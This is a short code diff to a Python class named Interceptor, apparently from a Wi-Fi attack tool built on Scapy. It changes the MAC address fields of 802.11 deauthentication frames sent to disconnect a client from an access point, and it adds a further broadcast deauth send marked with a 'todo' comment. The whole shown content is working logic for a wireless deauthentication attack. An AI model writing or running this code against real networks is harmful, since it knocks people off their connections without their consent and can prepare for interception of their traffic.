@@ -173,9 +173,13 @@ class Interceptor:
                           deauth_frm,
                           iface=self.interface)
                     sendp(rd_frm /
-                          Dot11(addr1=ap_mac, addr2=client_mac, addr3=ap_mac) /
+                          Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
                           deauth_frm,
                           iface=self.interface)
+                    sendp(rd_frm /
+                          Dot11(addr1=client_mac, addr2=self._BROADCAST_MACADDR, addr3=self._BROADCAST_MACADDR) /
+                          deauth_frm,
+                          iface=self.interface)  # todo broadcast works?
             sleep(self._deauth_intv)
 
     def run(self):
